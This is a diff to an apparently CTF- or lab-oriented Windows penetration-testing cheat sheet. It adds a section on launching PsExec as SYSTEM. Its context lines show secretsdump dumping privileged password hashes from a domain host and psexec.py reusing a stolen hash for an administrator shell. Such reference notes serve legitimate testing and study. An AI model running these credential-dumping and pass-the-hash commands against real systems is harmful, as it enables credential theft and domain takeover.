@@ -33,7 +33,7 @@ Table of Contents
       * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
       * [From DNSAdmin group to Administrators](#from-dnsadmin-to-administrator)
       * [From Exchange Windows Permissions group to Administrators](#from-exchange-windows-permissions-group-to-administrators)
-      * [Execute the x64 PowerShell](#execute-the-x64-powershell)
+      * [Run PsExec as SYSTEM](#run-psexec-as-system)
    * [Post Explotation Windows](#post-explotation-windows)
       * [Extract locally saved NTLM from Windows](#extract-locally-saved-ntlm-from-windows)
       * [Adding Firewall rules](#adding-firewall-rules)
@@ -341,6 +341,11 @@ Secretsdump can be utilized to get hashes of more privileged users:
 secretsdump [DOMAIN]/[USER]:[PASSWORD]@10.10.10.161
 # And if we have luck, we can use the hash with *psexec*, or try to crack it.
 ./psexec.py -hashes :[HASH] [DOMAIN]/administrator@[RHOST] powershell.exe
+```
+
+## Run PsExec as SYSTEM
+```powershell
+Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList '/k C:\...\PsExec.exe -i -s powershell.exe'
 ```
 
 #  Post Explotation
